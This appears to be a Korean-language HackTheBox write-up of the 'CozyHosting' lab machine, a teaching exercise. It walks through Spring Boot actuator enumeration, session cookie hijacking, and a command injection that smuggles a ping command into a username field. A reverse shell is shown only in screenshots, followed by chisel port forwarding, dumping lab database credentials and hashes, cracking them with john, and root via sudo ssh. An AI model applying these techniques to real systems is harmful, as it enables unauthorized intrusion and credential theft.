# CozyHosting -HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA cozyhosting 10.10.11.230
```
<img width="1105" height="280" alt="image" src="https://github.com/user-attachments/assets/f875233a-18d8-4248-9f06-945f80371cf2" />

- SSH(22)
- HTTP(80)
---
## HTTP
- `/etc/hosts` 추가
<img width="1105" height="65" alt="image" src="https://github.com/user-attachments/assets/3909ee72-0430-4444-8526-e8bba459fd30" />

### banner grabbing
```bash
whatweb http://cozyhosting.htb

curl -IL http://cozyhosting.htb
```
<img width="1107" height="414" alt="image" src="https://github.com/user-attachments/assets/7598c474-0526-435b-9b0f-014413f16561" />

### Spring Boot
- 어떤 서버파일을 사용하는지 몰라 `index.php`로 접속을 시도하니 `Whitelabel Error Page` 오류 메시지가 출력.
<img width="762" height="194" alt="image" src="https://github.com/user-attachments/assets/bede2a67-b332-4187-a985-912f2822d9de" />

<br>
<br>

- https://stackoverflow.com/questions/66915431/heroku-shows-whitelabel-error-page-but-not-on-localhost
- `Spring Boot`오류 페이지로 확인되어 해당하는 wordlist를 지정하여 `gobuster`실행.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -u http://cozyhosting.htb
```
<img width="1103" height="520" alt="image" src="https://github.com/user-attachments/assets/9f4e8d35-f894-409c-b332-c24897397910" />

<br>
<br>

- `/actuator/session`에 접속하니 `Cookie`처럼 보이는 것을 확인.
<img width="541" height="140" alt="image" src="https://github.com/user-attachments/assets/0ea1c920-32a6-40c6-af88-f4e294a3890e" />

<br>
<br>

- `JSESSIONID`쿠키 값을 바꿔서 접속하니 로그인버튼이 사라진 상태로 접속이 됨.
<img width="1100" height="470" alt="image" src="https://github.com/user-attachments/assets/10da655b-87ab-40f4-8f8c-6de8dcfe2f3a" />

<br>
<br>

- `/actuator/mappings`에서 `/admin`경로 발견.
<img width="499" height="503" alt="image" src="https://github.com/user-attachments/assets/d74c58fa-c5b3-4cc0-9b94-3db5be68cf91" />

<br>
<br>

- `/admin` 접속.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/1c641977-b0bd-4e7d-8a02-81851da698a7" />

### Command Injection
- `Hostname`과 `Username`을 넣어서 `Submit`버튼을 클릭하니 `ssh`로 연결을 시도하는 듯한 오류가 보임.
<img width="1100" height="302" alt="image" src="https://github.com/user-attachments/assets/af509556-5245-4331-89e3-6e3751e94754" />

<br>
<br>

- `Username`에 `ping`테스트 커맨드를 넣어서 `burpsuite`로 전달하니 `Username can't contain whitespaces!`라는 에러를 발견.
<img width="773" height="305" alt="image" src="https://github.com/user-attachments/assets/9e71d666-b2f4-4442-84db-4ff7b8fc9838" />

<br>
<br>

- `Username`에 `kali;{ping,10.10.16.4};`를 집어넣어서 전달.
<img width="773" height="362" alt="image" src="https://github.com/user-attachments/assets/19538159-26fa-4f9d-84c0-0f0bc0e60ca7" />

<br>
<br>

- Ping test 성공.
<img width="1105" height="200" alt="image" src="https://github.com/user-attachments/assets/b23bc95e-d820-4141-8074-bd3237b387ef" />

<br>
<br>

- `ex.sh` 리버스 셸 코드 생성.
<img width="1105" height="88" alt="image" src="https://github.com/user-attachments/assets/a6e67a6b-4921-4cf5-b193-3908a0f0c3a3" />

<br>
<br>

- 스크립트 다운로드.
<img width="506" height="35" alt="image" src="https://github.com/user-attachments/assets/eb9185d8-9151-41b3-a98e-36670ea24baa" />

<br>
<br>

- 스크립트 실행.
<img width="506" height="35" alt="image" src="https://github.com/user-attachments/assets/e3924afc-36f5-461f-8cf2-ccc8c877bbd1" />

<br>
<br>

- 셸 획득.
<img width="1105" height="178" alt="image" src="https://github.com/user-attachments/assets/0ea4fefb-f04a-4ea4-ba89-4de745a5a09f" />

---
## Privesc
- `cloudhosting-0.0.1.jar`를 발견.
<img width="1105" height="104" alt="image" src="https://github.com/user-attachments/assets/d6a195c5-cddc-489c-9abd-681b8fb2b6fa" />

<br>
<br>

- `/actuator/env` 아래부분에 `Configuration` 위치에 대해서 언급되어 있는 것을 확인.
<img width="674" height="946" alt="image" src="https://github.com/user-attachments/assets/50d02f35-1674-4b99-a473-a243cb0b06a8" />

<br>
<br>

- 로컬로 `jar`파일을 옮겨서 `jd-gui`로 확인.
- `postgresql`의 계정 정보를 발견.(postgres:Vg&nvzAQ7XxR)
```bash
jd-gui cloudhosting.jar
```
<img width="1100" height="243" alt="image" src="https://github.com/user-attachments/assets/d9340635-9f0f-49b5-bae2-1e89e0e2a565" />

<br>
<br>

- `chisel`로 포트포워딩 생성.
```bash
./chisel server --reverse -v -p 8000

./chisel client 10.10.16.4:8000 R:5432:127.0.0.1:5432
```
<img width="1114" height="224" alt="image" src="https://github.com/user-attachments/assets/668aa62e-eb37-4215-886f-5c4788c46ccc" />

<br>
<br>

- `postgres:Vg&nvzAQ7XxR`로 postgres 연결.
```bash
psql -h localhost -U postgres
```
<img width="1114" height="139" alt="image" src="https://github.com/user-attachments/assets/4fbf3bcb-0178-4f7d-8cd2-0c6d09bf043a" />

<br>
<br>

- `kanderson`과 `admin`의 해시 발견.
```psql
\l

\c cozyhosting

\d

select * from users;
```
<img width="1104" height="403" alt="image" src="https://github.com/user-attachments/assets/e6f9b1be-4d84-4542-8748-36452a15eaa2" />

<br>
<br>

- `john`으로 크래킹 시도하여 `manchesterunited` 비밀번호 획득.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1104" height="175" alt="image" src="https://github.com/user-attachments/assets/80ec5928-d3fe-42bb-acfa-643d81dcc97c" />

<br>
<br>

- `/etc/passwd`에서 `josh`를 발견.
<img width="1104" height="100" alt="image" src="https://github.com/user-attachments/assets/59e18d90-91fb-4a7c-95e6-c179c5487d54" />

<br>
<br>

- `josh:manchesterunited`로그인.
```bash
su - josh
```
<img width="1104" height="43" alt="image" src="https://github.com/user-attachments/assets/52f35055-97f4-45eb-831a-2c896ce97fe7" />

<br>
<br>

- `root`권한으로 `ssh`를 실행 가능.
```bash
sudo -l
```
<img width="1104" height="209" alt="image" src="https://github.com/user-attachments/assets/8c3c57bb-5b12-43ad-bf9e-a11525b8646b" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/ssh/
- `GTFOBIN`을 참조하여 `root`셸 획득.
<img width="1104" height="85" alt="image" src="https://github.com/user-attachments/assets/982bd205-14ee-4433-a49f-7f602426bc17" />

## FLAG
- `/home/josh/user.txt`
<img width="1104" height="250" alt="image" src="https://github.com/user-attachments/assets/bc5995c0-b572-44e2-b0dc-8c55d2707c01" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="268" alt="image" src="https://github.com/user-attachments/assets/d25669b8-1d99-4903-8a2f-de1378cc55a4" />











